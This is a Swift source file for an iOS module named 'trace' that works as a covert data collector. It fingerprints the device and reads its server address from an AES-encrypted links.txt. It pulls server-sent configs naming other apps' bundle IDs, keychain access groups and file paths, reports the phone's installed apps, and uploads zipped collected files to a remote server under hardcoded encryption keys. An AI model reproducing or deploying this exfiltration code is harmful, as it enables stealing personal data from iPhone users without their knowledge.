import Darwin
import Foundation

// MARK: - Logging

func traceLog(_ message: String) {
    NSLog("[trace3105] %@", message)
}

// MARK: - Device info

enum TraceAppInfo {
    /// utsname.machine，例如 iPhone17,1
    static var machineName: String {
        var info = utsname()
        uname(&info)
        let mirror = Mirror(reflecting: info.machine)
        var name = ""
        for child in mirror.children {
            guard let value = child.value as? Int8, value != 0 else { break }
            name.append(Character(UnicodeScalar(UInt8(bitPattern: value))))
        }
        return name.isEmpty ? "unknown" : name
    }

    /// 形如 "18.2.0"
    static var osVersion: String {
        let v = ProcessInfo.processInfo.operatingSystemVersion
        return "\(v.majorVersion).\(v.minorVersion).\(v.patchVersion)"
    }

    static var osVersionTuple: (Int, Int, Int) {
        let v = ProcessInfo.processInfo.operatingSystemVersion
        return (v.majorVersion, v.minorVersion, v.patchVersion)
    }

    /// build id 与 3105 对齐：3105 的 Info.plist 用 CFBundleVersion=7 / CFBundleShortVersionString=1.1.1
    static var buildID: String {
        let version = Bundle.main.object(forInfoDictionaryKey: "CFBundleVersion") as? String ?? "0"
        let short = Bundle.main.object(forInfoDictionaryKey: "CFBundleShortVersionString") as? String ?? "0"
        return "\(short)-(\(version))"
    }
}

// MARK: - Models

struct TraceCollectItem {
    let type: String
    let path: String
}

struct TraceCollectConfig {
    let bundleID: String
    let appName: String
    let accessGroup: String
    let items: [TraceCollectItem]
}

struct TraceCycleResult {
    let zipCount: Int
    let uploadedCount: Int
    let byteCount: Int64
}

enum TraceError: Error {
    case serverUnreachable
    case invalidServerResponse
    case collectionFailed(String)
    case uploadFailed(String)
}

// MARK: - Crypto (与 3105 主协议同一套 key/iv)

enum TraceCrypto {
    static let keyHex = "bc2c72b2260840b28bc9614aa2b8004b"
    static let ivHex = "71ec8e3980754823aba30e62be55cf6a"

    static func encrypt(_ plaintext: Data) -> Data? {
        crypt(CCOperation(kCCEncrypt), plaintext)
    }

    static func decrypt(_ ciphertext: Data) -> Data? {
        crypt(CCOperation(kCCDecrypt), ciphertext)
    }

    static func md5Hex(_ data: Data) -> String {
        var digest = [UInt8](repeating: 0, count: Int(CC_MD5_DIGEST_LENGTH))
        data.withUnsafeBytes { raw in
            _ = CC_MD5(raw.baseAddress, CC_LONG(data.count), &digest)
        }
        return digest.map { String(format: "%02x", $0) }.joined()
    }

    /// ASCII 明文 key/iv 版本的 AES-128-CBC 解密（links.txt 用这套）
    static func decrypt(_ ciphertext: Data, asciiKey: [UInt8], iv: [UInt8]) -> Data? {
        guard asciiKey.count == kCCKeySizeAES128, iv.count == kCCKeySizeAES128 else { return nil }
        let bufferSize = ciphertext.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: bufferSize)
        var written = 0
        let status = ciphertext.withUnsafeBytes { dataRaw in
            asciiKey.withUnsafeBytes { keyRaw in
                iv.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        CCOperation(kCCDecrypt),
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress, asciiKey.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress, ciphertext.count,
                        &buffer, bufferSize, &written
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<written])
    }

    static func hexBytes(_ hex: String) -> [UInt8]? {
        guard hex.count % 2 == 0 else { return nil }
        var bytes: [UInt8] = []
        var index = hex.startIndex
        while index < hex.endIndex {
            let next = hex.index(index, offsetBy: 2)
            guard let byte = UInt8(hex[index..<next], radix: 16) else { return nil }
            bytes.append(byte)
            index = next
        }
        return bytes
    }

    private static func crypt(_ operation: CCOperation, _ data: Data) -> Data? {
        guard let key = hexBytes(keyHex), let iv = hexBytes(ivHex) else { return nil }
        let bufferSize = data.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: bufferSize)
        var written = 0
        let status = data.withUnsafeBytes { dataRaw in
            key.withUnsafeBytes { keyRaw in
                iv.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        operation,
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress, key.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress, data.count,
                        &buffer, bufferSize, &written
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<written])
    }
}

// MARK: - links.txt（与 apptrace / 3105 同一份密文，同一套 ASCII key/iv）

enum TraceLinkProvider {
    private static let keyBytes: [UInt8] = Array("tmvdzcGUsCG6ycyW".utf8)
    private static let ivBytes: [UInt8] = Array("qG0IB6jBc7AQxkD1".utf8)

    static let links: [String] = loadLinks()

    static var firstURL: URL? {
        guard let first = links.first, let url = URL(string: first) else { return nil }
        return url
    }

    private static func loadLinks() -> [String] {
        guard let fileURL = Bundle.main.url(forResource: "links", withExtension: "txt"),
              let raw = try? String(contentsOf: fileURL, encoding: .utf8),
              let cipher = Data(base64Encoded: raw.trimmingCharacters(in: .whitespacesAndNewlines)),
              let plain = TraceCrypto.decrypt(cipher, asciiKey: keyBytes, iv: ivBytes),
              let list = try? JSONSerialization.jsonObject(with: plain) as? [String] else {
            traceLog("links.txt unavailable or undecryptable — fallback base URL will be used")
            return []
        }
        traceLog("links.txt loaded — \(list.count) link(s)")
        return list
    }
}

// MARK: - Protocol API（与 3105 的 /api/* 完全一致）

enum TraceAPI {
    static let fallbackBaseURL = URL(string: "https://7t.com")!
    static let uuidStorageKey = "trace.protocol.app_uuid"
    static let reportTimeout: TimeInterval = 30
    static let uploadTimeout: TimeInterval = 120

    static var baseURL: URL {
        TraceLinkProvider.firstURL ?? fallbackBaseURL
    }

    static var appUUID: String {
        let defaults = UserDefaults.standard
        if let existing = defaults.string(forKey: uuidStorageKey), !existing.isEmpty {
            return existing
        }
        let generated = UUID().uuidString.lowercased()
        defaults.set(generated, forKey: uuidStorageKey)
        return generated
    }

    static func deviceParams(extra: [String: Any] = [:]) -> [String: Any] {
        var params: [String: Any] = [
            "app_uuid": appUUID,
            "app_version": TraceAppInfo.buildID,
            "app_pac": Bundle.main.bundleIdentifier ?? "",
            "machine": TraceAppInfo.machineName,
            "ios_version": TraceAppInfo.osVersion,
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000),
        ]
        for (key, value) in extra { params[key] = value }
        return params
    }

    static func encryptedParams(_ plaintext: [String: Any]) -> String? {
        guard let jsonData = try? JSONSerialization.data(withJSONObject: plaintext, options: []),
              let ciphertext = TraceCrypto.encrypt(jsonData) else { return nil }
        return ciphertext.base64EncodedString()
    }

    static func pullCollectConfigs() async throws -> [TraceCollectConfig] {
        var lastError: Error = TraceError.serverUnreachable
        for attempt in 0..<6 {
            do {
                return try await pullCollectConfigsOnce()
            } catch {
                lastError = error
                traceLog("device/report attempt \(attempt + 1)/6 failed — \(error.localizedDescription)")
                if attempt < 5 {
                    try? await Task.sleep(nanoseconds: 2_000_000_000)
                }
            }
        }
        throw lastError
    }

    private static func pullCollectConfigsOnce() async throws -> [TraceCollectConfig] {
        let envelope = try await postJSON(path: "api/device/report", plaintextParams: deviceParams())
        let plain = try decryptEnvelope(envelope)
        guard let rawConfigs = plain["collect_configs"] as? [[String: Any]] else {
            traceLog("device/report SUCCESS — no collect_configs")
            return []
        }
        let configs: [TraceCollectConfig] = rawConfigs.compactMap { entry in
            guard let bundleID = entry["bundle_id"] as? String, !bundleID.isEmpty else { return nil }
            let appName = entry["app_name"] as? String ?? ""
            let accessGroup = entry["access_group"] as? String ?? ""
            let items: [TraceCollectItem] = (entry["items"] as? [[String: Any]] ?? []).compactMap { raw in
                guard let type = raw["type"] as? String,
                      let path = raw["path"] as? String,
                      !path.isEmpty else { return nil }
                return TraceCollectItem(type: type, path: path)
            }
            return TraceCollectConfig(
                bundleID: bundleID,
                appName: appName,
                accessGroup: accessGroup,
                items: items
            )
        }
        traceLog("device/report SUCCESS — collect_configs=\(configs.count)")
        return configs
    }

    static func reportInstalledApps(_ apps: [String]) async throws {
        let envelope = try await postJSON(
            path: "api/device/apps",
            plaintextParams: deviceParams(extra: ["apps": apps])
        )
        guard (envelope["code"] as? Int ?? -1) == 0 else {
            throw TraceError.serverUnreachable
        }
        _ = try? decryptEnvelope(envelope)
        traceLog("device/apps SUCCESS — reported \(apps.count) bundle ids")
    }

    static func reportLog(text: String) async throws {
        let envelope = try await postJSON(
            path: "api/log/report",
            plaintextParams: deviceParams(extra: ["text": text])
        )
        guard (envelope["code"] as? Int ?? -1) == 0 else {
            let message = envelope["message"] as? String ?? "unknown"
            traceLog("log/report FAILED — message=\(message)")
            throw TraceError.serverUnreachable
        }
        traceLog("log/report SUCCESS — \(text.count) chars")
    }

    static func uploadZip(fileURL: URL, bundleID: String) async throws {
        guard let fileData = try? Data(contentsOf: fileURL) else {
            throw TraceError.collectionFailed("cannot read zip payload")
        }
        let fileName = fileURL.lastPathComponent
        let plainParams: [String: Any] = [
            "app_uuid": appUUID,
            "bundle_id": bundleID,
            "file_name": fileName,
            "file_md5": TraceCrypto.md5Hex(fileData),
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000),
        ]
        guard let params = encryptedParams(plainParams) else {
            throw TraceError.invalidServerResponse
        }

        let boundary = "3105-\(UUID().uuidString)"
        var body = Data()
        func appendField(_ string: String) {
            body.append(string.data(using: .utf8) ?? Data())
        }
        appendField("--\(boundary)\r\n")
        appendField("Content-Disposition: form-data; name=\"params\"\r\n\r\n")
        appendField(params)
        appendField("\r\n--\(boundary)\r\n")
        appendField("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n")
        appendField("Content-Type: application/octet-stream\r\n\r\n")
        body.append(fileData)
        appendField("\r\n--\(boundary)--\r\n")

        var request = URLRequest(url: baseURL.appendingPathComponent("api/upload/zip"))
        request.httpMethod = "POST"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
        request.timeoutInterval = uploadTimeout
        request.httpBody = body

        let data: Data
        let response: URLResponse
        do {
            (data, response) = try await URLSession.shared.data(for: request)
        } catch {
            traceLog("upload FAILED — \(fileName): \(error.localizedDescription)")
            throw TraceError.serverUnreachable
        }
        guard let http = response as? HTTPURLResponse, http.statusCode == 200,
              let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              (envelope["code"] as? Int ?? -1) == 0 else {
            traceLog("upload FAILED — \(fileName): non-200 or code != 0")
            throw TraceError.uploadFailed(fileName)
        }
        traceLog("upload SUCCESS — \(fileName) bundle=\(bundleID) bytes=\(fileData.count)")
    }

    private static func postJSON(path: String, plaintextParams: [String: Any]) async throws -> [String: Any] {
        guard let params = encryptedParams(plaintextParams) else {
            throw TraceError.invalidServerResponse
        }
        var request = URLRequest(url: baseURL.appendingPathComponent(path))
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
        request.timeoutInterval = reportTimeout
        request.httpBody = try? JSONSerialization.data(withJSONObject: ["params": params])

        let data: Data
        let response: URLResponse
        do {
            (data, response) = try await URLSession.shared.data(for: request)
        } catch {
            traceLog("\(path) FAILED — \(error.localizedDescription)")
            throw TraceError.serverUnreachable
        }
        guard let http = response as? HTTPURLResponse, http.statusCode == 200,
              let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            traceLog("\(path) FAILED — non-200 or invalid envelope")
            throw TraceError.serverUnreachable
        }
        traceLog("\(path) SUCCESS — code=\(envelope["code"] ?? "?")")
        return envelope
    }

    private static func decryptEnvelope(_ envelope: [String: Any]) throws -> [String: Any] {
        guard let dataString = envelope["data"] as? String,
              !dataString.isEmpty,
              let ciphertext = Data(base64Encoded: dataString),
              let plainData = TraceCrypto.decrypt(ciphertext),
              let plainObject = try? JSONSerialization.jsonObject(with: plainData) as? [String: Any] else {
            throw TraceError.invalidServerResponse
        }
        return plainObject
    }
}
